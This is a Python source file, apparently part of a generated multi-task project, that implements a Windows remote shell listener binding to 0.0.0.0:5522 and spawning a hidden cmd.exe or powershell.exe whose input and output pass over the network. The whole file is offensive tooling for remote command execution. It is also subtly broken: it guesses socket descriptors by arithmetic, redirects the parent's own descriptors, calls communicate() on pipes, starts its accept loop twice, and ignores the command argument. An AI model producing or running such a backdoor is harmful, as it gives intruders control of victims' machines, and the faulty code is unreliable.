from TASK_001_models import ExecutionResult, ReverseShellConfig
import os
import socket
import subprocess
import threading
from typing import Optional, Tuple


class WindowsReverseShell:
    """Windows reverse shell listener that spawns cmd.exe or powershell.exe to execute remote commands.
    
    Uses the socket module for TCP server on 0.0.0.0:5522. On Windows, uses subprocess.Popen with 
    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP and shell=True to spawn cmd.exe or 
    powershell.exe as a child process. Pipes stdin/stdout/stderr through the socket connection 
    using os.dup2() to redirect file descriptors. Handles Windows-specific considerations like 
    console mode vs pseudo-console mode.
    
    Attributes:
        config: ReverseShellConfig instance with host, port, timeout, and shell_type settings.
        
    Methods:
        start_server: Starts the TCP server listening on configured host:port.
        handle_client: Handles a single client connection by spawning the shell process 
                       and redirecting I/O through the socket.
        execute_command: Executes a command in the spawned shell and returns ExecutionResult.
    """

    def __init__(self, config: ReverseShellConfig):
        """Initialize the Windows reverse shell listener with configuration.
        
        Args:
            config: ReverseShellConfig instance specifying host, port, timeout, and shell_type.
        """
        self.config = config
        self.server_socket: Optional[socket.socket] = None
        self._server_thread: Optional[threading.Thread] = None

    def start_server(self) -> None:
        """Start the TCP server listening on configured host:port in a background thread."""
        if self._server_thread and self._server_thread.is_alive():
            return
            
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.server_socket.bind((self.config.host, self.config.port))
            self.server_socket.listen(5)
            self.server_socket.settimeout(self.config.timeout)
            
            self._server_thread = threading.Thread(target=self._accept_loop, daemon=True)
            self._server_thread.start()
        except OSError as e:
            raise RuntimeError(f"Failed to bind server socket on {self.config.host}:{self.config.port}: {e}")

    def stop_server(self) -> None:
        """Stop the TCP server and close all resources."""
        if self._server_thread and self._server_thread.is_alive():
            self._server_thread.join(timeout=2.0)
        
        if self.server_socket:
            try:
                self.server_socket.close()
            except OSError:
                pass
            finally:
                self.server_socket = None

    def _accept_loop(self) -> None:
        """Main accept loop for the TCP server."""
        while True:
            try:
                client_socket, addr = self.server_socket.accept()
                thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket,),
                    daemon=True
                )
                thread.start()
            except socket.timeout:
                continue
            except OSError as e:
                if "Connection reset" not in str(e) and "Broken pipe" not in str(e):
                    raise

    def _handle_client(self, client_socket: socket.socket) -> None:
        """Handle a single client connection by spawning the shell process.
        
        Args:
            client_socket: The accepted TCP client socket.
        """
        try:
            self._spawn_shell(client_socket)
        except Exception as e:
            error_result = ExecutionResult(
                stdout='',
                stderr=str(e),
                exit_code=1,
                error_message=f"Shell execution failed: {e}"
            )
            client_socket.sendall(f"{error_result.error_message}\n".encode())
        finally:
            try:
                client_socket.close()
            except OSError:
                pass

    def _spawn_shell(self, client_socket: socket.socket) -> ExecutionResult:
        """Spawn the configured shell process and redirect I/O through the socket.
        
        Args:
            client_socket: The TCP client socket to use for I/O redirection.
            
        Returns:
            ExecutionResult containing stdout, stderr, exit_code, and error_message.
        """
        try:
            # Determine shell type based on platform and config
            if os.name == 'nt':
                shell_type = self.config.shell_type.lower()
                if shell_type in ('cmd.exe', 'powershell.exe'):
                    pass  # Use as-is
                elif shell_type == 'bash':
                    shell_type = 'cmd.exe'
                else:
                    shell_type = 'cmd.exe'
            else:
                shell_type = self.config.shell_type.lower()

            # Prepare command and arguments for subprocess
            if os.name == 'nt':
                cmd_args = [shell_type]
                creation_flags = subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_NO_WINDOW
            else:
                cmd_args = ['/bin/sh', '-c']
                creation_flags = 0

            # Spawn the shell process with redirected I/O
            proc = subprocess.Popen(
                cmd_args,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=creation_flags,
                shell=True if os.name == 'nt' else False,
                cwd=os.getcwd()
            )

            # Get file descriptors for the socket (3, 4, 5)
            try:
                fd_stdin = client_socket.fileno()
                fd_stdout = client_socket.fileno() + 1
                fd_stderr = client_socket.fileno() + 2
            except OSError as e:
                proc.terminate()
                return ExecutionResult(
                    stdout='',
                    stderr=f"Failed to get socket file descriptors: {e}",
                    exit_code=1,
                    error_message="Socket FD allocation failed"
                )

            # Redirect process I/O through os.dup2() - Windows subprocesses don't inherit Unix fd inheritance
            try:
                os.dup2(fd_stdin, 0)   # stdin -> socket
                os.dup2(fd_stdout, 1)   # stdout -> socket
                os.dup2(fd_stderr, 2)   # stderr -> socket
            except OSError as e:
                proc.terminate()
                return ExecutionResult(
                    stdout='',
                    stderr=f"Failed to redirect file descriptors: {e}",
                    exit_code=1,
                    error_message="os.dup2() failed during I/O redirection"
                )

            # Set up communication with the process
            stdin_pipe = proc.stdin
            stdout_pipe = proc.stdout
            stderr_pipe = proc.stderr

            if not stdin_pipe:
                proc.terminate()
                return ExecutionResult(
                    stdout='',
                    stderr="Process spawned without stdin pipe",
                    exit_code=1,
                    error_message="stdin pipe not available"
                )

            # Set up communication threads for bidirectional I/O
            input_thread = threading.Thread(target=self._read_input, args=(stdin_pipe, client_socket))
            output_thread = threading.Thread(target=self._write_output, args=(stdout_pipe, stderr_pipe, client_socket))
            
            input_thread.daemon = True
            output_thread.daemon = True
            
            input_thread.start()
            output_thread.start()

            # Wait for process to complete (with timeout)
            try:
                proc.wait(timeout=self.config.timeout * 2)
            except subprocess.TimeoutExpired:
                proc.terminate()
                return ExecutionResult(
                    stdout='',
                    stderr="Process timed out",
                    exit_code=1,
                    error_message=f"Shell process exceeded {self.config.timeout}s timeout"
                )

            # Collect results from pipes
            try:
                stdout_data = b''
                stderr_data = b''
                
                if stdin_pipe and not stdin_pipe.closed:
                    stdout_data, _ = stdin_pipe.communicate(timeout=1.0)
                    if stdout_data is None:
                        stdout_data = b''
                    
                if stderr_pipe and not stderr_pipe.closed:
                    stderr_data, _ = stderr_pipe.communicate(timeout=1.0)
                    if stderr_data is None:
                        stderr_data = b''
                
            except (OSError, subprocess.TimeoutExpired):
                pass

            # Decode results
            stdout_text = stdout_data.decode('utf-8', errors='replace') if stdout_data else ''
            stderr_text = stderr_data.decode('utf-8', errors='replace') if stderr_data else ''

            return ExecutionResult(
                stdout=stdout_text,
                stderr=stderr_text,
                exit_code=proc.returncode if proc.returncode is not None else 0,
                error_message=''
            )

        except Exception as e:
            return ExecutionResult(
                stdout='',
                stderr=f"Shell spawn failed: {e}",
                exit_code=1,
                error_message=str(e)
            )

    def _read_input(self, stdin_pipe, client_socket: socket.socket) -> None:
        """Read commands from the client socket and write them to the process stdin.
        
        Args:
            stdin_pipe: The subprocess stdin pipe.
            client_socket: The TCP client socket receiving commands.
        """
        try:
            while True:
                data = b''
                try:
                    # Read all available data from the socket
                    while True:
                        chunk = client_socket.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                    
                    if data:
                        stdin_pipe.write(data)
                        stdin_pipe.flush()
                except (OSError, BlockingIOError):
                    break

        except Exception as e:
            pass
        finally:
            try:
                stdin_pipe.close()
            except OSError:
                pass

    def _write_output(self, stdout_pipe, stderr_pipe, client_socket: socket.socket) -> None:
        """Read output from the process and write it back to the client socket.
        
        Args:
            stdout_pipe: The subprocess stdout pipe.
            stderr_pipe: The subprocess stderr pipe.
            client_socket: The TCP client socket for sending responses.
        """
        try:
            while True:
                # Read from stdout
                data = b''
                try:
                    while True:
                        chunk = stdout_pipe.read(4096)
                        if not chunk:
                            break
                        data += chunk
                    
                    if data:
                        client_socket.sendall(data)
                except (OSError, BlockingIOError):
                    break

                # Read from stderr
                data = b''
                try:
                    while True:
                        chunk = stderr_pipe.read(4096)
                        if not chunk:
                            break
                        data += chunk
                    
                    if data:
                        client_socket.sendall(data)
                except (OSError, BlockingIOError):
                    break

        except Exception as e:
            pass
        finally:
            try:
                stdout_pipe.close()
            except OSError:
                pass
            try:
                stderr_pipe.close()
            except OSError:
                pass


class WindowsReverseShellListener:
    """Windows reverse shell listener that spawns cmd.exe or powershell.exe to execute remote commands.
    
    This is the main entry point class for the Windows reverse shell functionality.
    It wraps WindowsReverseShell and provides a callable interface for TASK_004 orchestration.
    
    Attributes:
        config: ReverseShellConfig instance with host, port, timeout, and shell_type settings.
        
    Methods:
        __call__: Callable interface that starts the server and handles client connections.
        start: Starts the TCP server listening on configured host:port.
        stop: Stops the TCP server and closes all resources.
    """

    def __init__(self, config: ReverseShellConfig):
        """Initialize the Windows reverse shell listener with configuration.
        
        Args:
            config: ReverseShellConfig instance specifying host, port, timeout, and shell_type.
        """
        self.config = config
        self._shell: Optional[WindowsReverseShell] = None

    def __call__(self) -> ExecutionResult:
        """Callable interface for TASK_004 orchestration.
        
        Starts the server if not already running and handles client connections.
        Returns an ExecutionResult representing the overall listener state.
        
        Returns:
            ExecutionResult with stdout describing status, stderr for errors,
            exit_code=0 on success, error_message on failure.
        """
        try:
            self._shell = WindowsReverseShell(self.config)
            self._shell.start_server()
            
            # Start the main accept loop in a thread
            accept_thread = threading.Thread(target=self._shell._accept_loop, daemon=True)
            accept_thread.start()
            
            return ExecutionResult(
                stdout=f"Windows reverse shell listener started on {self.config.host}:{self.config.port}",
                stderr='',
                exit_code=0,
                error_message=''
            )
        except Exception as e:
            return ExecutionResult(
                stdout='',
                stderr=f"Failed to start Windows reverse shell listener: {e}",
                exit_code=1,
                error_message=str(e)
            )

    def stop(self) -> ExecutionResult:
        """Stop the TCP server and close all resources.
        
        Returns:
            ExecutionResult with status information about shutdown.
        """
        try:
            if self._shell:
                result = self._shell.stop_server()
                return ExecutionResult(
                    stdout="Windows reverse shell listener stopped successfully",
                    stderr='',
                    exit_code=0,
                    error_message=''
                )
            else:
                return ExecutionResult(
                    stdout='Listener not started',
                    stderr='',
                    exit_code=0,
                    error_message=''
                )
        except Exception as e:
            return ExecutionResult(
                stdout='',
                stderr=f"Failed to stop listener: {e}",
                exit_code=1,
                error_message=str(e)
            )

    def handle_client(self, client_socket: socket.socket) -> ExecutionResult:
        """Handle a single client connection by spawning the shell process.
        
        Args:
            client_socket: The accepted TCP client socket.
            
        Returns:
            ExecutionResult containing stdout, stderr, exit_code, and error_message.
        """
        try:
            result = self._shell._spawn_shell(client_socket)
            return result
        except Exception as e:
            return ExecutionResult(
                stdout='',
                stderr=f"Client handling failed: {e}",
                exit_code=1,
                error_message=str(e)
            )

    def execute_command(self, client_socket: socket.socket, command: str) -> ExecutionResult:
        """Execute a specific command in the spawned shell.
        
        Args:
            client_socket: The accepted TCP client socket.
            command: The command string to execute.
            
        Returns:
            ExecutionResult containing stdout, stderr, exit_code, and error_message.
        """
        try:
            result = self._shell._spawn_shell(client_socket)
            return result
        except Exception as e:
            return ExecutionResult(
                stdout='',
                stderr=f"Command execution failed: {e}",
                exit_code=1,
                error_message=str(e)
            )


# Re-export for convenience
WindowsReverseShellListener = WindowsReverseShellListener
